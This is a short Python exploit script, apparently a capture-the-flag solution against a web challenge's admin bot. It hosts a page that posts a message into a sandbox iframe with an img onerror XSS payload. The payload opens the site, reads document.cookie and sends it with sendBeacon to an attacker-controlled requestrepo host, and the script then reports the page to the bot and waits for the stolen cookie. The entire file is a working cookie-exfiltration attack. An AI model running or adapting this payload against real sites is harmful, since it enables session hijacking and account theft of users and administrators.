from requestrepo import Requestrepo
import requests

BOT_URL = "http://localhost:1337/"

class MyRepo(Requestrepo):
    def on_request(self, request):
        if request.type == "http" and "/cookie" in request.path:
            print(request.raw)
            exit()


repo = MyRepo()

target_page = f"http://web.{repo.subdomain}.{repo.domain}/"

HTML = f"""
<iframe id="iframe" src="http://web:3000/sandbox"></iframe>

<script>
const iframe = document.getElementById("iframe");
iframe.addEventListener("load", () => {{
    iframe.contentWindow.postMessage({{
        type: "render-html",
        html: `<img src="x" onerror="w=window.open('/');navigator.sendBeacon('{target_page}cookie', w.document.cookie)">`
    }}, "*");
}});
</script>
""".strip()

repo.set_file("index.html", HTML, status_code=200)

requests.post(f"{BOT_URL}api/report", json={
    "url": target_page
})

repo.await_requests()